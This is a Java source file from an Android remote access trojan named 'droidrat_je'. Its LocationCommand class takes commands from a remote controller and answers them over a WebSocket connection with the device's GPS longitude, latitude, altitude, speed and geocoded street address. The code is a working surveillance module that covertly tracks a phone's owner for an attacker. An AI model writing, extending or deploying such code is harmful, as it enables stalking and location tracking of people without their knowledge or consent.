package com.je_chen.droidrat_je.rat.command;

import android.content.Context;
import android.location.LocationManager;
import android.util.Log;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.modules.location.LocationGeocode;
import com.je_chen.droidrat_je.rat.modules.location.LocationSystem;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.droidRatWebSocketClient;


public class LocationCommand extends CommandFather {

    private final LocationSystem locationSystem;
    private final LocationGeocode locationGeocode;

    public LocationCommand(Context context, LocationManager locationManager, String type, int sec, int meter) {
        locationSystem = new LocationSystem(locationManager, type, sec, meter);
        locationGeocode = new LocationGeocode(context);
    }

    @Override
    public void send(String value) {
        droidRatWebSocketClient.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            String TAG = "Location Event";
            switch (rawCommandArray[1]) {
                case "Longitude":
                    double Longitude = locationSystem.getLastKnownLocation("gps").getLongitude();
                    Log.d(TAG, "Location Longitude");
                    this.send("Location Longitude: " + Longitude);
                    break;
                case "Altitude":
                    double Altitude = locationSystem.getLastKnownLocation("gps").getAltitude();
                    Log.d(TAG, "Location Altitude");
                    this.send("Location Altitude: " + Altitude);
                    break;
                case "Latitude":
                    double Latitude = locationSystem.getLastKnownLocation("gps").getLatitude();
                    Log.d(TAG, "Location Latitude");
                    this.send("Location Latitude: " + Latitude);
                    break;
                case "Speed":
                    double Speed = locationSystem.getLastKnownLocation("gps").getSpeed();
                    Log.d(TAG, "Location Speed");
                    this.send("Location Speed: " + Speed);
                    break;
                case "LocationGeo":
                    String LocationGeo = locationGeocode.getAddressLine(locationSystem.getLatitude(), locationSystem.getLongitude(), 5);
                    Log.d(TAG, "Location LocationGeo");
                    this.send("Location LocationGeo: " + LocationGeo);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
